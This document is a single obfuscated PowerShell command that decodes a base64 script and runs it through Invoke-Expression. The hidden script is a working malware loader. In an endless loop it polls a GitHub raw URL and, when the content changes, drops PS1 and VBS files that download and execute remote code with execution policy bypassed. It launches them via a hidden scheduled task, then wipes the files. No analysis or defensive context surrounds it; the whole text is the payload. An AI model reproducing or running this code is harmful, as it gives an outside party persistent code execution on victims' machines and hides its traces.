$r="ZnVuY3Rpb24gRXhlY3Ugew0KICAgIFBhcmFtICgkY29tLCRhcmcpICAgIA0KICAgIGlmICghKCRhcmcpKSB7DQogICAgICAgICRhcmcgPSAiICINCiAgICB9DQogICAgJHJuZCA9IEdldC1SYW5kb20NCiAgICAkdG4gPSAkcm5kDQogICAgJGdkZSA9IEdldC1EYXRlIDsNCiAgICAkZ2QgPSAkZ2RlLkFkZE1pbnV0ZXMoMSkNCiAgICAkaHIgPSAkZ2QuaG91ciANCiAgICAkbW4gPSAkZ2QuTWludXRlDQogICAgaWYgKCRociAtbHQgMTAgKSB7JGhyID0gIjAkaHIifQ0KICAgIGlmICgkbW4gLWx0IDEwICkgeyRtbiA9ICIwJG1uIn0NCiAgICAkc3QgPSAiJGhyLSRtbiIuUmVwbGFjZSgiLSIsIjoiKSAgICANCiAgICAkeXIgPSAkZ2QuWWVhciAgICA7ICAgICRtID0gJGdkLk1vbnRoDQogICAgaWYgKCRtIC1ndCA5KXsgJG1vbiA9ICRtIH0gZWxzZSB7ICRtb24gPSAiMCRtIiB9IDsgJGQgPSAkZ2QuRGF5DQogICAgJHRpbWUgPSAiJHlyLSRtb24tJGQlVCRzdCU6MDAiLlJlcGxhY2UoIiUiLCIiKQ0KICAgICRkYXRlID0gIjIwMjQtMDEtMDFUMTY6MjA6MDAiIDsgJHN0ID0gJHRpbWUNCiAgICAkZmlsZSA9ICRjb20gOyAkYXJndW1lbnRzID0gJGFyZw0KICAgICR4bWxwYSA9ICJDOlxXaW5kb3dzXFN5c3RlbTMyXFRhc2tzXCR0biINCiAgICAiWytdIFRBU0tOQU1FYHQkdG4iDQogICAgIlsrXSBDT01NQU5EYHQkZmlsZSINCiAgICAiWytdIEFSR1VNRU5UU2B0JGFyZ3VtZW50cyINCiAgICAiWytdIFNUQVJUIFRJTUVgdCRTVCINCiAgICAiWytdIFBBVEggJHhtbHBhIg0KICAgIHRyeSB7ICAkdGltID0gJGdkLlRvU2hvcnRUaW1lU3RyaW5nKCkNCiAgICAgICAgJGFjdCA9IE5ldy1TY2hlZHVsZWRUYXNrQWN0aW9uIC1FeGVjdXRlICRmaWxlICAtQXJndW1lbnQgICRhcmd1bWVudHMNCiAgICAgICAgJHRyaSA9IE5ldy1TY2hlZHVsZWRUYXNrVHJpZ2dlciAtT25jZSAtQXQgJHRpbQ0KICAgICAgICAkc2V0ID0gTmV3LVNjaGVkdWxlZFRhc2tTZXR0aW5nc1NldCAtQWxsb3dTdGFydElmT25CYXR0ZXJpZXMgDQogICAgICAgIFJlZ2lzdGVyLVNjaGVkdWxlZFRhc2sgLUFjdGlvbiAkYWN0IC1UcmlnZ2VyICR0cmkgLVNldHRpbmdzICRzZXQgIC1UYXNrTmFtZSAkdG4gfCBPdXQtTnVsbA0KICAgIH0gY2F0Y2ggeyAkeG1sYyA9ICI8P3htbCB2ZXJzaW9uPWAiMS4wYCIgZW5jb2Rpbmc9YCJVVEYtMTZgIj8+YG48VGFzayB2ZXJzaW9uPWAiMS4yYCIgeG1sbnM9YCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmRvd3MvMjAwNC8wMi9taXQvdGFza2AiPmBuICA8UmVnaXN0cmF0aW9uSW5mbz5gbiAgICA8RGF0ZT4kZGF0ZTwvRGF0ZT5gbiAgICA8QXV0aG9yPiRlbnY6Y29tcHV0ZXJuYW1lXCRlbnY6dXNlcm5hbWU8L0F1dGhvcj5gbiAgICA8VVJJPlwkVE48L1VSST5gbiAgPC9SZWdpc3RyYXRpb25JbmZvPmBuICA8VHJpZ2dlcnM+YG4gICAgPFRpbWVUcmlnZ2VyPmBuICAgICAgPFN0YXJ0Qm91bmRhcnk+JFNUPC9TdGFydEJvdW5kYXJ5PmBuICAgICAgPEVuYWJsZWQ+dHJ1ZTwvRW5hYmxlZD5gbiAgICA8L1RpbWVUcmlnZ2VyPmBuICA8L1RyaWdnZXJzPmBuICA8U2V0dGluZ3M+YG4gICAgPE11bHRpcGxlSW5zdGFuY2VzUG9saWN5Pklnbm9yZU5ldzwvTXVsdGlwbGVJbnN0YW5jZXNQb2xpY3k+YG4gICAgPERpc2FsbG93U3RhcnRJZk9uQmF0dGVyaWVzPmZhbHNlPC9EaXNhbGxvd1N0YXJ0SWZPbkJhdHRlcmllcz5gbiAgICA8U3RvcElmR29pbmdPbkJhdHRlcmllcz5mYWxzZTwvU3RvcElmR29pbmdPbkJhdHRlcmllcz5gbiAgICA8QWxsb3dIYXJkVGVybWluYXRlPmZhbHNlPC9BbGxvd0hhcmRUZXJtaW5hdGU+YG4gICAgPFN0YXJ0V2hlbkF2YWlsYWJsZT50cnVlPC9TdGFydFdoZW5BdmFpbGFibGU+YG4gICAgPFJ1bk9ubHlJZk5ldHdvcmtBdmFpbGFibGU+ZmFsc2U8L1J1bk9ubHlJZk5ldHdvcmtBdmFpbGFibGU+YG4gICAgPElkbGVTZXR0aW5ncz5gbiAgICAgIDxEdXJhdGlvbj5QVDEwTTwvRHVyYXRpb24+YG4gICAgICA8V2FpdFRpbWVvdXQ+UFQxSDwvV2FpdFRpbWVvdXQ+YG4gICAgICA8U3RvcE9uSWRsZUVuZD50cnVlPC9TdG9wT25JZGxlRW5kPmBuICAgICAgPFJlc3RhcnRPbklkbGU+ZmFsc2U8L1Jlc3RhcnRPbklkbGU+YG4gICAgPC9JZGxlU2V0dGluZ3M+YG4gICAgPEFsbG93U3RhcnRPbkRlbWFuZD50cnVlPC9BbGxvd1N0YXJ0T25EZW1hbmQ+YG4gICAgPEVuYWJsZWQ+dHJ1ZTwvRW5hYmxlZD5gbiAgICA8SGlkZGVuPnRydWU8L0hpZGRlbj5gbiAgICA8UnVuT25seUlmSWRsZT5mYWxzZTwvUnVuT25seUlmSWRsZT5gbiAgICA8V2FrZVRvUnVuPmZhbHNlPC9XYWtlVG9SdW4+YG4gICAgPEV4ZWN1dGlvblRpbWVMaW1pdD5QVDcySDwvRXhlY3V0aW9uVGltZUxpbWl0PmBuICAgIDxQcmlvcml0eT43PC9Qcmlvcml0eT5gbiAgPC9TZXR0aW5ncz5gbiAgPEFjdGlvbnMgQ29udGV4dD1gIkF1dGhvcmAiPmBuICAgIDxFeGVjPmBuICAgIDxDb21tYW5kPiRmaWxlPC9Db21tYW5kPmBuICAgIDxBcmd1bWVudHM+JGFyZ3VtZW50czwvQXJndW1lbnRzPmBuICAgIDwvRXhlYz5gbiAgPC9BY3Rpb25zPmBuICA8UHJpbmNpcGFscz5gbiAgICA8UHJpbmNpcGFsIGlkPWAiQXV0aG9yYCI+YG4gICAgICA8VXNlcklkPiRlbnY6Y29tcHV0ZXJuYW1lXCRlbnY6dXNlcm5hbWU8L1VzZXJJZD5gbiAgICAgIDxMb2dvblR5cGU+SW50ZXJhY3RpdmVUb2tlbjwvTG9nb25UeXBlPmBuICAgICAgPFJ1bkxldmVsPkxlYXN0UHJpdmlsZWdlPC9SdW5MZXZlbD5gbiAgICA8L1ByaW5jaXBhbD5gbiAgPC9QcmluY2lwYWxzPmBuPC9UYXNrPiINCiAgICAgICAgJHhtbGMgPiAkeG1scGENCiAgICAgICAgdHJ5IHsgQzpcV2luZG93c1xTeXN0ZW0zMlxzY2h0YXNrcy5leGUgL2NyZWF0ZSAvWE1MICR4bWxwYSAvdG4gJHRuIC9mICAgfSBjYXRjaCB7IEM6XFdpbmRvd3NcU3lzdGVtMzJcc2NodGFza3MuZXhlIC9jcmVhdGUgL3RuICR0biAvdHIgIiRmaWxlICRhcmd1bWVudHMiIC9TQyBEQUlMWSAvU1QgJHN0IC9mIH0gICAgICAgICAgICANCiAgICB9DQogICAgc2xlZXAgODAgOyB0cnkgeyBVbnJlZ2lzdGVyLVNjaGVkdWxlZFRhc2sgLVRhc2tOYW1lICR0biAgLUNvbmZpcm06JGZhbHNlIH0gY2F0Y2ggeyBDOlxXaW5kb3dzXFN5c3RlbTMyXHNjaHRhc2tzLmV4ZSAvZGVsZXRlIC90biAkdG4gL2YgfQ0KICAgIA0KfQ0KDQpGdW5jdGlvbiBnaXQgew0KDQogICAgdHJ5IHsgIA0KICAgIHRyeSB7ICRjb24gPSAkdy5Eb3dubG9hZFN0cmluZygkcmwpIH0gY2F0Y2ggeyAkY29uID0gSXdyIC1Vc2VCYXNpY1BhcnNpbmcgIC1VcmkgJHJsIH0NCg0KICAgIGlmICghKFtzdHJpbmddOjppc251bGxvckVtcHR5KCRjb24pKSkgew0KICAgICAgICAgICAgDQogICAgICAgICRwYWsgPSAiJGVudjo/Pz8/Pz8/cD8/Pz9cTVBhY2thZ2VzIg0KICAgICAgICAkY2hxID0gIiRwYWtcSWNvbkNhY2hlIg0KICAgICAgICANCiAgICAgICAgaWYgKCEoJGIuZm9sZGVyRXhpc3RzKCRwYWspKSl7DQogICAgICAgICAgICBtZCAkcGFrIHwgT3V0LU51bGwNCiAgICAgICAgfQ0KDQogICAgICAgIGlmICh0ZXN0LXBhdGggJGNocSl7DQogICAgICAgICAgICBbaW50XSRyZWQgPSBbU3lzdGVtLklPLkZpbGVdOjpSZWFkQWxsVGV4dCgkY2hxKQ0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgJHJlZCA9IDANCiAgICAgICAgfQ0KDQogICAgICAgICRsZWQgPSAkY29uLmxlbmd0aA0KDQogICAgICAgICJSRUQgJHJlZGBuTEVEICRMRUQiDQogICAgICAgIGlmICgkcmVkIC1uZSAkbGVkKXsNCg0KICAgICAgICAgICAgIlsrXSBFeGVjdXRlIE5ldyBDb2RlICINCiAgICAgICAgICAgIFtTeXN0ZW0uSU8uRmlsZV06OldyaXRlQWxsVGV4dCgkY2hxLCRsZWQpDQogICAgDQogICAgICAgICAgICAkZmlsZXNzID0gJyR3ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudCA7ICRzID0gTmV3LU9iamVjdCAtQ29tT2JqZWN0IFdzY3JpcHQuU2hlbGwgOyAkZSA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OkFTQ0lJLkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCJhSFIwY0hNNkx5OXlZWGN1WjJsMGFIVmlkWE5sY21OdmJuUmxiblF1WTI5dEwxTTBUVk16VUM5WVdGZ3ZiV0ZwYmk5SlJWaEUiKSkgOyAkYyA9ICR3LkRvd25sb2FkU3RyaW5nKCRlKSA7IGlmICghKFtzdHJpbmddOjppc251bGxvcmVtcHR5KCRjKSkpIHsgLihbY2hhcl0xMDUrW2NoYXJdMTAxK1tjaGFyXTEyMCkgJGMgfScNCiAgICAgICAgICAgICRybmQgPSBHZXQtUmFuZG9tDQoNCiAgICAgICAgICAgICRmaWV4ID0gIiRlbnY6cHVibGljXCRybmQucHMxIg0KICAgICAgICAgICAgJHZpZXggPSAiJGVudjpwdWJsaWNcJHJuZC52YnMiDQogICAgICAgICAgICANCiAgICAgICAgICAgICR2YnMgPSAiT24gRXJyb3IgUmVzdW1lIE5leHQgOiBSYW5kb21pemUgIDogYiA9IFJvdW5kKFJuZCAqIDEwMCkgLyBSb3VuZChSbmQgKiAxMDAwMCkgOiBzZXQgcyA9IENyZWF0ZU9iamVjdChgIndzY3JpcHQuU2hlbGxgIikgOiBzLnJ1biAgYCJjbWQuZXhlIC9jICAgcG93ZXJzaGVsbC5leGUgICAgLWV4ZWMgYnlwYXNzIC1mICRmaWV4IGAiICwgMCINCg0KICAgICAgICAgICAgW1N5c3RlbS5JTy5GaWxlXTo6V3JpdGVBbGxUZXh0KCRmaWV4LCRmaWxlc3MpDQogICAgICAgICAgICBbU3lzdGVtLklPLkZpbGVdOjpXcml0ZUFsbFRleHQoJHZpZXgsJHZicykNCg0KICAgICAgICAgICAgRXhlY3UgLWNvbSAiQzpcV2luZG93c1xTeXN0ZW0zMlx3c2NyaXB0LmV4ZSIgLWFyZyAiJHZpZXgiDQogICAgICAgICAgICBzZGVsIC1wYXRoICR2aWV4DQogICAgICAgICAgICBzZGVsIC1wYXRoICRmaWV4DQoNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICJbLV0gRXhlY3V0ZSBOTyBOZXcgQ29kZSAiDQogICAgICAgIH0NCiAgICB9IGVsc2Ugew0KICAgICAgICBzbGVlcCAxMA0KICAgIH0gfWNhdGNoIHt9DQp9DQoNCmZ1bmN0aW9uIHNkZWx7DQogICAgUGFyYW0oJHBhdGgpDQogICAgaWYgKHRlc3QtcGF0aCAkUGF0aCkgew0KICAgICAgICAkcm5kID4gJHBhdGgNCiAgICAgICAgZGVsICRwYXRoIC1Gb3JjZQ0KICAgIH0NCn0NCg0KJHJsID0gImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9TNE1TM1AvWFhYL21haW4vSUVYRCINCiRzaCA9IE5ldy1PYmplY3QgLUNvbU9iamVjdCBXc2NyaXB0LlNoZWxsIA0KJHcgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50DQokYiA9IE5ldy1PYmplY3QgLUNvbU9iamVjdCBTY3JpcHRpbmcuRmlsZVN5c3RlbU9iamVjdA0KJHJuZCA9IEdldC1SYW5kb20NCiRtZSA9ICRNeUludm9jYXRpb24uTXlDb21tYW5kLnBhdGgNCg0KDQp0cnkgeyAgIA0KICAgIGZvcig7Oyl7DQogICAgICAgIGdpdCA7IHNsZWVwIDIwDQogICAgfQ0KfSBjYXRjaCB7DQogICAgd2hpbGUgKCR0cnVlKSB7DQogICAgICAgIGdpdCA7IHNsZWVwIDIwICAgDQogICAgfQ0KfQ==";$e=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($r));$e|&([char]73+[char]69+'x')